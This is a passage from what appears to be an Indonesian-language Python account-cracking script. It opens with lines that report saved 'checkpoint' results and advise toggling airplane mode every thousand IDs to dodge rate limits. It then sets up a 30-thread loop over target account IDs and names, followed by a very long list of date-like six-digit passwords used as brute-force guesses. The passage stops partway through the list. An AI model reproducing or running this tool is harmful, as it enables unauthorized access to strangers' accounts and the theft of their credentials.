	print(f'>> Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
	print(f'>> Mainkan Mode Pesawat Setiap {m}1k{x} Idz\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['300102','020703','160201','150492','070521','121011','150702','040121','191101','010706','041116','140800','110714','010121','120890','210722','301213','220294','090510','150518','071095','150602','301107','171202','030103','010102','270104','180993','120995','031206','190201','251199','271205','011090','221016','160420','190197','191000','250399','170308','280317','290314','240807','220320','091008','130118','151191','050306','020920','230805','191211','231000','061022','220190','070411','080991','290996','200391','141016','261221','090102','050199','090494','230114','070795','031005','040111','130292','090203','021005','061115','301098','211094','050817','180209','161119','251112','270716','051013','300616','140816','200711','100692','221003','070591','140896','080890','130209','300604','120615','250914','180701','100818','130298','111216','300815','120699','161000','130613','190295','220622','091012','150501','251118','020518','231109','110394','121010','160522','101205','140500','060201','170716','110797','081012','210596','040992','160917','060914','160911','130914','290706','111006','270618','270121','061195','171208','270902','221217','120606','020806','140719','260215','271094','050398','190599','171206','290699','160614','121017','200719','040409','171214','120891','070710','120501','300394','020497','080202','221007','131097','220215','070895','141200','240904','091006','301217','110690','170709','231004','291007','020892','210518','160619','210399','100994','050210','080296','101019','141095','041203','140100','270996','290795','130111','121014','120608','280504','140515','291020','280800','110311','101204','230814','010290','081192','271005','040490','130501','020691','230797','141001','050201','050910','110507','090407','220704','201200','250201','300619','290806','060696','050293','190608','120194','041091','280322','280893','200300','150616','251009','250909','230799','160802','180110','020400','150716','031006','040422','251020','160306','230822','070491','160305','100198','050720','070818','290495','200812','180697','050419','140909','250302','140700','140600','080299','050800','150217','160906','131109','240106','040492','071096','101219','100290','230922','290191','171018','111209','260320','030709','110607','160112','151194','020890','290220','161003','300609','251104','250598','120500','290908','021203','280919','190112','130800','050109','240991','230813','220619','070709','261094','260417','020912','281005','150293','290994','240719','250690','300595','290898','150696','241107','170600','231217','261090','010396','170103','151209','271016','110496','080318','041014','030521','130801','100322','030414','301014','080422','260517','240295','240615','141108','071204','250516','291092','131200','140918','281022','190217','211101','120595','210503','041015','180997','170309','291196','030399','181015','290505','180202','141217','120496','190320','290514','130697','210220','130693','050220','100721','250798','200318','280706','171118','051106','081110','241106','191219','100508','071092','080306','020812','030398','180601','120697','240500','240622','051190','020490','111198','181214','010515','240410','050916','260691','080504','080110','110709','190911','170606','200693','251197','200110','210803','281209','220415','180120','300200','130402','280710','220790','250809','130800','200792','251013','160118','181204','130307','281215','260396','030222','100191','190118','211100','030205','110598','280694','280396','011214','210822','021092','070413','010295','260293','101100','090408','100821','050613','060706','260594','180703','260104','260892','180994','040209','260296','191194','070995','140211','260193','160108','141109','290592','300116','080517','080316','200598','140801','080791','080920','230397','190221','180716','190798','170617','220413','260295','131016','181002','180409','161212','170214','290719','300398','061004','090900','241191','100206','061295','230115','020303','210621','120307','030592','250111','180116','221193','030611','211192','040914','130700','271295','101098','281103','071121','091222','261106','241094','090219','040318','010698','100107','150699','181206','090794','080320','100799','161211','071294','241193','070610','210196','231110','100496','050616','060800','130991','031298','011103','040603','240520','020306','140513','220307','020719','020501','211106','010293','010508','270298','280304','281090','030400','030318','070495','050217','070390','030807','071016','151017','150318','021009','190216','270704','040518','130690','131199','240521','181003','090921','070194','171222','200818','010998','140595','231191','060399','150115','020396','020918','270701','020620','180518','260504','121192','151012','110909','200312','220992','190318','290613','031296','220102','220712','110596','090807','040302','280499','100522','141117','240110','020203','200916','200900','010716','020899','130808','280490','071190','270593','280222','300103','140405','030812','231014','150794','240618','020408','091005','250514','181109','210421','200190','020500','100307','090496','300297','261290','170100','300706','230518','040305','270620','200202','191190','041008','110211','210694','250797','130815','180611','190914','010317','060506','130721','171105','021295','031008','230998','171022','130392','090700','260816','040995','041191','270392','190817','060213','060600','270698','261294','090405','221295','090599','110799','051218','080595','290197','221196','300820','081098','120297','111193','161292','090992','210497','100996','070707','161009','030595','200196','081122','210307','210717','200718','290822','191121','061201','140797','191200','030196','091122','160822','120922','281211','140403','290793','120211','160199','141013','300895','180996','250518','121091','061021','080610','190807','261104','210300','120597','290502','180709','261115','260613','230509','190910','210291','041194','090792','010900','021120','180415','261016','140101','220895','220201','021110','061293','281114','050904','250600','040691','250390','131001','160508','030913','190598','141190','210712','200206','150706','290114','101207','050812','151114','130793','020994','170420','040895','250897','261210','090802','040493','060292','280310','130205','260299','260820','230505','020803','250611','130212','010204','130391','040592','100100','090418','040295','170115','071203','020414','080510','240894','081020','301008','171210','060821','250408','140118','280615','170904','260900','260512','240522','071011','080421','270291','190309','220808','220303','230196','170816','061196','260919','201190','031095','230710','121122','201009','041299','140910','140219','160307','110201','300918','271293','071017','070690','170820','200800','130822','161205','251200','050410','220605','110509','280204','281191','291205','111106','041007','010613','080114','160191','210420','160490','171011','010216','260720','210515','161221','300100','110804','071108','150993','260219','280718','261213','220700','080606','240499','051114','011015','150116','100612','060402','160618','160198','150106','290810','150818','060604','240596','210305','120596','170591','150897','121195','010692','171296','020392','150807','281021','121214','110599','061000','291111','061298','060318','250193','260598','050611','190307','060603','110609','150306','040797','270818','110110','030100','011120','270300','180290','140204','081211','201006','010908','070102','090109','130112','290812','040513','250406','241103','060808','010815','070600','170906','110894','060493','020602','240321','050420','060207','220920','161012','200416','300303','290922','090114','290897','170318','090622','210310','191014','071006','161200','041208','251106','080912','251105','200605','090198','230197','080999','051292','160106','251204','140912','020309','190222','230212','100815','140691','250808','231012','130799','170997','170604','300894','010807','241009','100394','110307','180621','040602','281222','170298','051221','220796','290807','191215','291018','131002','270305','130894','120413','111010','110694','031221','290298','170718','150822','010416','010913','280510','140697','210200','020593','291005','151216','130907','211107','021016','190612','140304','171017','290901','141092','140315','050608','110619','141218','161202','240797','200822','180515','230804','300215','210296','180291','141292','250219','270993','020792','030416','281015','180316','110422','211191','170219','040906','130607','090714','110221','221299','150919','140620','210494','200414','110415','150615','180504','241219','020694','291208','191020','140701','080904','210816','190995','220195','240905','130308','170116','190113','050206','120894','200118','131196','041110','200514','210821','220601','221296','111120','280501','251008','131216','210316','270521','100900','221190','050521','110299','220817','010211','140309','260198','031016','260392','230600','080398','210308','061299','040901','240900','291000','210113','070598','040703','180500','281299','300796','300893','230994','191206','220292','241194','130718','140306','210697','140591','290703','201108','120798','260907','270510','040913','161216','110815','121216','020120','171298','130595','100921','040590','280492','070307','151213','101191','140493','130896','241011','120820','010202','140496','290121','090999','260212','011020','011122','110402','070309','011099','211013','241095','101212','291108','230615','170917','280898','110403','211093','030713','260915','261012','150920','020402','191093','030299','120903','120115','131015','081105','060916','220412','230598','031107','060400','200396','120605','240621','250892','050511','090511','100301','171295','090520','200212','010997','170611','060203','220319','060721','280821','120818','190921','140891','081201','030515','301204','180193','260715','110390','171121','160207','290408','030508','010897','270200','141101','130606','081010','291197','011005','280421','250196','110890','190618','201017','130519','140612','100105','260420','290796','241299','120101','040520','080607','261000','160506','240908','051090','131205','130792','070820','070622','110711','130401','281120','210108','040407','300300','240219','110818','161204','121293','230398','150317','120292','160922','241294','010609','170390','270916','260321','020312','080914','190594','301004','300798','061194','150215','021008','041214','150717','220612','250700','210605','300607','010617','131022','281110','130517','260898','230912','240502','060803','281099','250613','010117','040311','170197','050800','160505','050290','110490','070312','131110','211002','170294','071216','271190','120499','231293','140218','210211','050703','121204','290399','110303','090601','100291','060119','060109','230191','270112','140400','280494','050911','040104','230694','010808','251200','220312','140222','191207','040719','241120','140103','270913','111099','200322','190907','170317','030917','211111','080600','061005','250202','251299','300505','190191','170421','281208','241119','040498','060490','190316','161199','160811','230306','121021','030317','011016','190694','070800','081092','100600','241111','160718','070195','280900','160101','130122','241217','190301','270909','110912','130303','181107','101293','160301','220393','290894','051006','120414','240912','030296','260507','220720','140502','040198','270915','200400','181190','160995','030900','060500','300493','280416','230213','161096','241215','100390','110703','081290','030311','021111','090922','100407','170292','120693','021214','070300','270119','210702','041098','200509','250294','290318','100305','150613','050416','260204','180705','020311','230914','050714','090915','300704','100398','280119','161214','190900','180519','270100','150904','140795','290420','240207','121009','171108','100712','220993','020391','271111','110320','110421','190600','170800','110492','120600','270391','151094','091118','030698','240917','191191','040799','090117','021001','240202','080419','240310','060212','260210','260595','160891','050516','140297','181217','261095','010201','030922','241100','050222','120399','140413','271297','250515','170117','221205','270198','010195','050997','030621','211110','021298','120514','290214','160497','301000','291113','060897','221118','240709','080500','110618','060910','181298','140516','011000','260912','120613','060703','230921','150122','110998','030510','041210','180822','090522','230611','010413','280814','081118','020820','050297','260108','240714','260207','290294','171100','300921','270817','230490','090191','130514','130803','110800','060591','251208','280793','150490','031017','200314','220202','020313','170411','240700','140318','250700','271097','191122','261100','120110','070793','130618','110316','130300','241209','250890','170618','180115','070210','080592','291110','290203','081006','081212','020290','230693','060501','301295','201000','270205','050498','300993','170422','020200','291290','061203','011017','090512','270197','160502','061003','050998','040599','041104','100802','180108','280808','230317','280402','180702','151101','150718','241100','200115','161294','060319','130295','170501','170400','101003','091015','020913','150712','210912','150596','070190','300496','160211','291021','020291','211296','070515','111295','171114','040522','140690','130219','060617','270594','170510','231194','190298','300909','211003','030505','210398','160109','181010','290511','210507','120690','290504','051121','190719','011092','210114','261102','070220','260114','130322','140216','080712','101299','040898','150707','040606','130500','141122','071094','300390','190210','210998','231100','190693','071290','030898','280715','270410','291008','111212','210317','080297','291119','290693','060994','220200','060411','221294','050492','040999','010203','030217','180622','091209','290903','150607','300897','090118','050715','050803','170804','220990','091296','050509','281012','040403','190796','160314','260694','010398','190300','281212','250912','150291','040410','050692','250994','180606','150396','180300','140321','010819','020516','180397','260121','300594','190404','260496','051021','080497','240414','270192','160504','270398','170813','110308','060912','211005','160715','240214','220701','190418','301018','280393','140320','300115','121096','251099','261118','030504','030700','080194','070398','020999','110399','261004','210594','180100','220316','041119','290321','100708','101092','160793','140106','050596','210204','110210','290791','060898','050819','190190','170506','200701','221206','140395','041118','210410','050322','060110','050993','220616','180413','300998','010493','101120','300292','260213','281106','100891','121297','220690','240513','080508','140196','080802','011218','110202','241105','160613','170708','161101','150394','111094','150817','121220','190511','250101','040208','210401','090116','020607','040200','060518','020305','130619','280998','210513','120122','240721','151292','190297','050308','020190','250819','260718','220418','260914','260603','271117','281200','250907','270603','160193','160894','220894','070621','070119','220409','240112','191298','021196','110811','110301','240300','230395','211119','101222','060695','140808','270196','230895','130694','090490','240611','140105','220416','210199','251297','161116','200316','210893','150896','301115','051201','230304','180712','100620','300792','160110','041291','180419','150910','060906','240519','030691','080818','070600','030817','030911','120195','080406','190393','030218','251294','010700','100798','130609','030893','031195','100392','100709','210411','090592','210994','020916','120916','190215','130104','180211','090918','151206','201202','280210','141291','071192','150900','300413','261093','061191','141290','150311','160617','290722','030320','290913','120793','220317','060398','081206','230801','100110','140590','150606','071201','290414','271209','040517','110514','151207','130416','250107','040500','080309','110508','051101','060214','120622','270706','190107','020991','150516','151098','120815','200508','040107','251000','030314','020504','200896','281109','170697','050702','190614','230915','010194','131190','100594','180821','140120','170807','050405','210294','200213','210815','280292','011113','181219','201104','200415','270496','080996','070693','190702','120300','191113','190692','200219','200513','080400','141194','050805','010599','040408','250209','180793','230812','170191','230908','130714','140299','270517','251211','240716','300793','281101','101008','100793','250491','290421','260408','090803','020495','300922','020191','030606','220114','151022','060304','270105','150703','050619','060208','140919','300695','040921','250417','210312','041298','070699','220410','050202','291293','270295','250699','170919','030791','160394','281008','300805','030115','230392','130515','061008','010314','150994','280897','150622','180908','061219','251221','090101','160904','050315','270509','200700','110404','050299','091000','250622','240995','260202','180405','131115','240694','110111','140121','290720','070108','141107','130717','180503','260600','270200','131214','060611','240500','011204','111117','060609','070304','140713','190818','190607','020592','181111','300600','160296','171293','180219','260711','190403','261296','161095','090910','220193','230293','131119','221104','240217','181296','150412','100909','260791','180612','020707','150620','060294','240808','231098','260518','120599','200611','041197','030920','041099','140418','190517','061110','240490','110809','030400','260804','150610','031021','110913','161000','021011','040108','030209','020394','150797','270498','260519','060905','060902','200706','091220','131102','260812','090207','160610','221012','210506','140822','100401','110319','141215','050900','191005','230516','061105','240204','220207','090420','081218','240302','141096','230107','280497','120801','271108','070219','041000','130313','090410','150204','211190','041101','270619','220507','181198','130805','020417','020122','230695','210919','220921','080790','080603','020594','110608','240994','130904','181091','280404','200518','101195','190605','220893','111122','080601','231113','171196','061119','200618','130420','081293','210217','090892','150609','060907','240590','300920','061112','060718','150214','040213','220394','080201','050595','090419','260200','061220','290919','060307','120704','230592','151221','010817','190305','230608','020101','250197','301293','060393','170705','140606','190793','151100','170409','230309','100504','021020','051019','150708','290709','220714','020492','071107','100490','010919','130211','281295','060202','060409','201117','260319','140890','291104','160499','250104','070503','140597','270994','070494','171200','080716','190509','130601','210897','081215','240793','181297','060313','130611','211297','090822','060491','041100','160716','110105','151299','080593','190291','021000','100696','250298','231022','201199','091098','061204','150618','010922','110406','300790','030607','240920','230919','300794','220106','100498','200600','180114','140190','100912','191295','200804','061001','141093','180992','010811','020102','110300','091112','230300','061190','250499','020411','120219','080894','011098','040598','160698','230597','140693','290418','200890','021021','240304','050914','040713','170291','251010','230715','021106','040116','071007','101217','110414','180309','201196','111115','150112','031009','061002','240113','080597','240392','160622','181005','130709','070809','181299','200800','290301','220390','150700','281115','221221','070310','270805','260499','250911','161210','040619','260801','050999','160621','140492','121019','020198','270597','261109','230795','100192','260318','120213','051298','190797','071218','111108','091197','171104','290590','230699','291201','041218','070706','010614','120904','171004','131020','250412','260111','190708','170218','101290','030415','241098','260909','241093','241211','120404','210414','160121','010593','080305','060410','090100','290892','030206','291200','121107','300411','280203','230222','110203','191193','090204','220422','121190','070198','160818','111213','210591','081193','260290','060316','160317','250820','201106','250612','220590','180690','100408','291121','080905','261100','030904','071297','070200','210903','040909','031203','101103','290296','230503','261021','210292','100396','141017','130494','150899','081299','090209','120909','020809','170694','021201','140706','181221','180207','190290','060295','100611','270808','220922','050996','120791','170509','280708','160399','200603','040304','120494','020419','220118','130921','300614','090990','011206','010611','280422','260122','200908','160494','190999','130597','050197','010594','041017','290400','130297','270113','200811','220512','030321','011111','191002','040510','090906','150521','040597','190802','111103','110500','221099','260304','300421','160105','051217','050699','010212','210521','240796','130220','040697','011008','180318','130820','060519','060713','131212','060711','040307','010390','101116','260115','210693','100819','090398','191011','170105','270616','240890','100901','160393','261205','220408','221198','220417','130997','081106','210715','200799','300504','210216','300495','080193','131294','071100','211208','260400','050794','140322','210412','291019','110418','070302','251290','191004','160421','270614','300308','070803','180403','260810','190895','110219','030605','210290','080308','280996','240801','211007','291204','070697','040990','020798','220291','260391','150395','030397','210818','290101','251012','190522','180422','131220','240412','220397','120119','150298','060692','190322','250608','281117','181090','201019','150509','190120','241297','200297','110602','040511','221101','030302','100202','090617','150816','080708','181210','060900','031103','120792','101199','110195','210102','050907','140894','091094','211196','130210','080313','260901','060593','180895','301091','091110','170408','071122','131103','250517','111215','220991','200209','251007','150795','110104','210520','290320','270722','190799','030102','230896','270892','221107','151121','200791','220521','290694','180200','251094','210392','140994','120300','300306','140494','191120','291114','060708','030490','180502','231009','270294','220722','120497','160397','200200','241118','250394','090495','071002','090615','300419','301105','140716','110298','250607','150307','060911','240711','090791','031000','170319','050691','161120','070604','200306','090115','060814','100904','260616','210617','210995','121205','080697','231021','260493','140107','290997','050896','190813','070118','270612','211221','281198','110218','011215','021208','300293','141296','041010','140300','070498','050500','141202','160200','090805','231204','200607','090517','260721','221002','141204','070293','240396','030105','190495','130202','241210','110915','150814','200210','281113','250707','170603','060505','290110','190198','230102','170515','030905','090703','231297','150600','151107','021104','290519','061222','180710','160516','280208','180808','120403','251206','280394','070721','260100','060192','230800','040611','160803','010197','040207','200417','200421','130794','120492','030909','190595','301112','221116','260522','270703','181295','031019','061014','120902','040292','180216','290308','200817','280194','130910','290798','260294','070204','010694','251203','040417','081119','240508','280512','250411','070507','230122','051096','101090','020919','010518','220295','060100','240620','230194','070916','050892','180109','050600','290217','110911','020395','040395','130909','060191','250510','190820','101197','220608','030801','301003','161104','060694','080913','160597','300611','230121','120701','280916','260102','270694','121002','110392','110613','120199','080404','220618','090690','170206','210490','190815','300422','050213','141208','050510','060108','180715','080520','290416','200100','041217','301192','270415','220611','090911','030622','020791','050506','010392','030213','050497','200193','090206','140995','221220','100312','201197','030600','190720','140813','070997','120901','071099','230412','260712','231120','280604','041109','040718','091108','230897','090902','140421','040412','040618','080294','090311','041102','160507','070899','211095','261217','120917','061214','170692','020604','021216','280713','251209','100814','220903','280207','230406','011093','241204','171209','010903','110704','151109','161007','250615','301108','220492','300618','080108','240398','110895','290601','200403','240507','150422','060822','251001','250906','170798','271214','210616','260893','171204','270404','240496','061093','201099','140821','040695','150709','260596','230314','230420','290309','110920','221195','230993','070500','240613','240208','110502','061010','270991','190705','290614','150399','100900','201211','250593','230995','300290','030393','241101','110693','281203','230400','210121','180501','060291','070807','020109','060610','080212','240200','180414','040110','110901','080720','030818','131104','211298','260492','010917','130400','270508','140722','131210','210509','280219','221108','231108','161108','250800','191015','040617','180618','300508','070290','200506','030696','210914','031211','050507','211295','010504','301202','121094','230206','030700','260794','010110','070921','221208','141019','290900','170293','041107','180796','220419','280798','280197','160691','291102','210391','290307','030599','060701','111102','090412','050298','170600','170300','051214','110396','080696','040912','180306','270715','240798','210200','260999','011011','260209','110215','210916','211293','291016','290299','121218','010713','170691','151004','100591','100117','150614','080900','190417','230916','040922','280408','240503','271101','120509','130413','120418','280419','300591','080922','281006','240315','090303','200201','081294','070917','280900','240103','281218','081210','100106','150119','110491','100118','080617','021007','151106','101211','010113','051011','230593','160600','120899','140717','070412','080197','130918','260315','151000','191008','230521','261010','100300','220400','280303','030616','170710','140112','010522','290600','060990','030491','010393','200121','200794','220112','200904','140616','130590','110897','110996','080701','270422','070111','061294','191204','240600','230104','211091','050609','200207','080713','250697','021212','111199','291094','050891','141295','241199','020195','040905','280103','301205','091200','190920','100321','240515','020993','050216','160315','291010','200995','230612','020622','200307','221112','091017','020802','160591','100918','170193','021096','090919','251003','040896','160514','170111','261208','040814','030407','260401','071195','031093','161092','021199','150820','010511','250200','030615','250490','040122','250812','271098','060809','301195','131021','160102','300396','171016','190916','101112','011202','020708','140720','061202','151019','051102','250321','080917','170415','021292','290116','060594','220695','301103','141119','170121','281200','120593','230900','130411','290290','110819','171103','190706','290710','130218','130506','080596','110302','161021','090300','091097','201103','060400','240892','130992','180206','300592','090210','080307','220103','210999','080218','290104','251102','130906','201102','110591','020216','051012','270519','020599','070209','230613','301196','060210','010310','271206','290518','280412','231213','060998','020815','280392','170418','161011','200806','030509','260508','280198','180791','100593','211019','260619','060522','090820','090909','070806','130917','070596','050400','210295','070103','221121','190804','171094','100592','280990','170595','301017','230917','100899','121217','221105','211194','190704','290606','251111','300405','140807','250599','120114','111201','101011','210894','190809','200810','150990','080793','030704','160404','110621','301214','170107','190220','231102','250301','280621','120298','150517','130206','240406','031191','100317','080616','280993','280892','260798','130821','121015','101193','031201','220396','181012','050414','130610','260710','231118','050512','261096','111003','030897','220411','260106','140815','220997','040701','160703','111000','080496','090913','210813','201208','020205','040614','291014','150906','070790','030200','131206','061006','080410','181000','180706','240512','170395','141205','180390','190494','080800','111297','150199','050301','190997','201210','030710','100391','240599','170299','090719','220314','040610','090313','100115','050599','230913','291221','201204','170404','150909','290708','300402','190716','290192','150414','221000','100609','221000','260990','140618','010800','301095','301215','070397','270213','180304','080812','121104','301093','130603','121114','160900','130622','041005','130602','230215','091221','111220','021202','100203','150202','160919','290300','170609','100304','280593','090201','291106','260993','100605','290413','300791','131291','150313','010218','150997','050614','111218','100300','100414','300906','091121','070692','210922','190415','250213','120695','170108','281207','280921','070420','250795','170109','281219','121000','090301','011121','050605','140791','130707','021291','251011','101099','130300','270803','260397','250814','030991','130812','051000','040322','020816','120192','050204','190610','140520','300113','130807','280112','121194','150401','070211','231005','060700','081100','070703','200708','080317','111196','221017','251100','220318','220615','100606','230410','281097','031204','261011','191107','210895','280191','170401','080717','280691','230698','280600','090296','240297','160302','271298','230200','090205','211020','061197','150805','280106','010517','200305','230807','230200','210417','021003','121213','091201','211115','050100','100207','140992','041021','010892','160503','130704','020219','231091','041204','270800','250990','081009','070893','240619','220621','180101','061114','201294','070401','190394','290392','220420','020906','280915','270794','031119','280811','160795','290410','100896','070607','050320','020196','260707','231210','291206','240902','051194','200998','220606','060517','271200','300294','081096','190814','260600','090515','150621','220290','151203','200610','190501','021099','110108','010797','240911','110892','270322','280291','100893','040411','151097','080505','171007','120921','270919','181116','241195','240216','120711','061108','231097','031193','220617','240602','180520','210809','070205','090893','160219','170403','210606','300995','270212','020420','190990','021091','151217','180898','211294','150207','081002','140292','160913','040993','030493','070712','251092','040811','110908','210690','240517','181092','081000','120598','190100','040621','141214','050709','101291','270702','050397','280799','251108','170903','191218','121006','040416','241102','250903','250117','140622','300403','260109','171098','240303','150409','190192','150419','060500','021206','180104','080711','180909','110702','270611','090300','041011','150504','050798','180801','170500','160707','241109','130105','140415','120322','140703','060412','051007','121222','060105','160720','271113','200601','160890','060220','141294','200114','170300','210804','101202','090308','010316','301104','060222','210604','180922','040299','261200','171294','210600','110691','140592','110708','221199','070320','260410','230494','110715','010198','030899','090505','270901','280397','150704','170698','231094','020605','141219','070292','121106','280200','050104','030815','290692','020194','220400','250596','180999','090218','010995','011109','050408','020510','040496','150292','170996','230796','240294','080714','211205','220298','050409','240998','230105','010521','200897','230491','151198','200594','211017','260415','091195','111197','270117','261000','290905','010422','290117','270800','251006','050810','230517','220104','100704','230393','050802','071292','220121','171015','040494','181222','090215','080692','241200','230618','290107','010699','050198','290111','291100','270108','250498','120807','110712','220898','231101','250418','031200','250721','010400','300900','260500','231111','060602','140509','250108','230898','090713','201110','220497','241020','250813','121103','031099','020503','281119','010497','020911','280917','151218','150316','110716','010896','281107','070106','190714','230216','280305','131204','061211','060794','170497','260905','141104','290700','300807','060893','020821','251202','270900','171097','150194','151291','180410','180911','080192','160996','250317','081208','120305','280913','170700','240605','041213','150808','180894','120312','150312','211090','110721','091113','290195','130905','161299','201111','211015','250307','040607','230112','281019','280605','141118','300217','170202','070700','070805','230120','160313','020891','110992','151199','070499','291191','280696','230794','040804','091203','270605','160322','071291','040693','191099','101203','010414','270809','160915','070113','060298','060820','221200','010516','130399','240497','051290','060817','150513','110393','260322','161017','230313','280594','160409','040798','190593','010708','070202','201201','190313','181122','250992','100803','101118','270598','230811','030914','091104','091192','051195','271018','070910','030498','250314','250617','090716','110995','020192','200707','250904','020514','060698','070911','091290','100501','080907','260205','190109','061120','030612','140311','191118','080221','230808','080303','071111','120896','140400','011107','040413','210992','290219','100892','130404','100292','250403','180817','261198','130722','160493','190922','300104','170911','130809','011200','271010','231216','150598','120819','261195','230408','211000','111294','011100','230117','221022','020110','110506','180907','250594','110720','090717','230320','180708','160116','150590','090891','160807','130397','230911','111092','030293','280104','050612','070497','050690','221010','180902','160615','010409','121212','240899','251216','270218','300122','190901','260498','260506','220699','080113','120716','111000','140220','210791','090793','231207','281105','050593','191021','041114','011000','240817','260802','090908','220598','170413','200795','110990','010114','040803','180493','101206','010206','130591','090200','220122','180218','071221','210500','070992','290814','270801','261204','050790','120417','100590','141120','190816','160820','141000','300118','290405','260995','050604','010400','050211','091092','210120','020307','070694','201001','070812','090603','061121','110312','071196','030408','011019','080399','291115','160520','260310','120513','171091','190111','110792','060900','060219','180303','150720','220120','231195','210691','180315','230910','231214','020416','200905','251005','110395','021103','230620','110614','130203','131017','250421','220905','140191','070403','100599','290616','201101','260796','060211','300620','270416','010700','200211','180609','160400','040820','150404','210907','031212','301199','020300','110292','060320','130197','140197','110408','051293','031007','041117','060722','261297','181118','130521','151007','121193','050602','161297','261103','100310','260291','300913','180194','230321','030809','101122','200714','220219','101014','200116','150495','261114','040391','251004','101117','160790','220794','141207','290494','120215','140714','211014','241022','300491','210600','010810','021004','150198','070594','020900','161102','270100','160912','110595','150995','260693','250410','040595','010101','030715','041219','170114','030390','101022','200492','020115','050103','230793','221119','230591','260513','030210','040805','010992','201209','111090','091007','200505','231206','130502','280791','170700','150408','110322','180610','250716','060193','140608','070395','080817','101192','070718','060421','080992','091190','020612','080619','070711','260491','140111','010495','051018','051198','180915','200993','230996','270816','140605','240697','280600','281193','271017','240804','090519','070792','290513','111096','220205','110902','200899','240197','010401','180395','191096','191294','040593','081115','131197','190994','170615','220815','241019','210622','030798','300510','140499','160821','220192','071101','190314','040221','110193','291297','100898','080618','070595','190498','031209','041009','130698','131094','290618','130490','211206','040390','280301','300120','020808','291120','150701','150503','101200','180292','101106','210514','060922','240203','041193','210812','040800','270595','010503','280805','010100','251098','130302','210911','210814','030919','190506','300819','301007','190717','140295','081021','180717','100415','110206','270402','170190','200704','150511','190700','210610','081296','230800','080813','190890','220520','021019','010719','140408','280195','050718','160910','020200','060818','100493','050590','080190','291214','080906','161097','240309','271009','060606','120204','050302','120911','040218','040917','161112','100309','041016','180798','250291','161219','171191','280716','170794','100411','290409','300407','020921','020609','171290','110291','120999','091207','230500','140397','231019','220117','270319','270321','270621','240413','150593','060798','151195','170898','140914','110501','280100','180411','091100','250597','231121','250309','080507','100719','300996','091016','200199','120100','120209','291109','141213','230901','191199','190496','050215','220896','020794','191090','201012','100199','070592','010417','271110','120804','090611','100293','270208','280899','290209','050908','031217','230404','110515','050814','260411','090812','250616','180302','030816','100795','230891','220795','160519','240506','271001','030110','060693','250908','170216','291192','030411','270907','030797','210902','010300','280118','040297','240509','260607','240999','190204','140712','160295','170102','300701','211201','120616','161103','260605','011112','260615','120315','100998','020108','020795','280519','051207','191092','030392','290507','050919','100517','220115','020493','200790','150815','061090','180613','180914','010408','040321','221005','071205','030211','020193','090593','020100','100190','270821','230504','070296','151000','151297','251190','190100','161220','020415','161298','101001','210409','030813','070609','040616','120508','280807','290610','011100','061208','230712','200398','020596','100913','190596','200600','030191','130916','211299','190411','190102','150908','030794','220600','160407','070518','270511','171106','280720','211009','180107','070502','070514','130100','031111','260799','031097','260495','200705','030995','260520','301006','140498','260921','040817','080402','170707','101294','091200','301099','050899','141090','080208','030690','280991','231291','290322','241220','030921','250290','260422','260818','010600','260617','170797','120604','231100','231295','240896','171200','280400','040615','301297','011102','250217','101091','230906','071003','160107','280818','230301','160200','270317','080794','300395','030113','290993','130102','221292','220392','080393','050701','060691','160814','030290','300514','020702','240712','290112','140603','131211','110808','130608','011115','051008','030703','020714','100509','121110','111017','030309','230402','070400','250319','041200','010306','290821','170918','070299','140511','030705','231018','100395','200413','280608','300316','230299','281116','061007','030301','120996','240893','050809','131293','260698','011118','200907','060892','151197','280907','100502','290802','090616','210519','271207','170392','210716','301100','210695','160897','190308','170891','010320','280693','241013','231116','300596','280110','120698','090295','030221','300814','300315','220892','080609','250701','010799','210598','230495','081008','240511','240700','010111','050111','141199','270791','010309','111020','140293','251296','130994','061113','300890','190203','081103','080699','180809','291009','130599','090513','070519','290395','011002','100121','180301','020811','300711','170521','231201','150705','121299','130294','121013','301209','091214','210915','290714','061019','160291','231290','201097','300910','270911','261092','160893','130207','170601','170620','240316','031121','031213','131217','140500','180912','250212','270822','020907','060194','110813','041004','150417','130819','080411','260890','090709','050491','040809','170900','030517','170803','230218','220793','271105','081090','060616','011091','250800','171099','120609','290201','191017','080204','020393','260701','010397','250998','100402','140198','170713','290899','241122','140290','161111','090801','161217','251091','140119','131101','250804','260301','020710','290797','111219','280992','300690','170295','131014','070393','031222','271012','120601','190193','210101','271200','270712','270109','201093','090202','260609','010603','011291','030512','300301','240992','120117','080718','120708','210207','210320','271220','300720','180815','080515','130422','240816','070300','081197','221009','101108','190114','301106','280211','170315','141098','040316','280891','180603','050821','010217','041022','291194','031011','110620','080516','181103','031113','300719','170695','041093','100614','181209','170514','200107','121118','100397','250704','030104','190998','031192','101215','131099','200798','080605','101104','210698','150290','040192','291202','280910','100302','010514','260297','040620','280601','260221','220503','240705','071194','250712','060315','290619','080621','280505','250295','080199','200599','230422','090898','301191','020898','201217','300112','170621','020308','140411','191192','171012','180818','291022','110313','260313','150410','100405','270700','020407','160304','201016','090694','151219','210608','280102','221008','300317','290906','150500','120116','221213','030619','150800','240117','051200','281210','231192','150594','120706','270222','280307','240607','010490','290915','060615','290704','060205','171102','120291','130715','110407','140392','291098','140996','300302','140698','071104','140820','220300','120121','261110','070616','300506','131207','220911','110592','220516','280810','170311','221103','300219','180600','040293','270315','141116','290391','210611','270110','160196','160392','171000','140997','011211','040193','260604','220804','230407','250621','301117','210906','210198','300991','201115','050314','040119','291291','081111','170212','290198','040690','161190','160398','090518','290808','220216','070319','111093','200320','021222','130192','180792','130318','110398','270420','160312','050393','270690','070716','120602','140213','051100','300397','011114','110197','060908','191019','160210','020793','280398','201109','040203','220311','210615','180522','281000','210793','050695','160220','300907','100422','210904','010714','220491','220217','030520','230318','090900','110812','280506','230594','290712','180494','070902','300415','081220','110400','030805','250492','291203','180217','260120','020618','050912','020894','061218','010990','141212','230195','100598','021220','060111','200891','230809','130106','281118','090312','010311','151003','240218','221117','040506','040308','220904','030808','220909','290108','041190','120294','170817','100215','080392','281100','170500','291295','240898','010710','100406','240306','141114','190892','280613','150915','130620','081114','021018','250801','180797','230791','070811','120504','050693','040405','050501','191102','211207','160208','140303','301193','110722','281001','250106','150512','200122','120309','071021','070392','280912','250918','140906','221091','231016','190116','191117','270290','170910','290910','090715','100697','181001','290622','060514','140110','051004','250817','140294','050712','061097','200494','210802','170297','300212','011217','120218','280590','120401','190206','061210','151192','131118','230110','100920','260708','120503','070897','100220','180506','080513','240710','101295','050415','020107','161090','270190','141009','130319','220206','121215','070913','250705','200793','111022','150893','120522','121000','300902','070322','021010',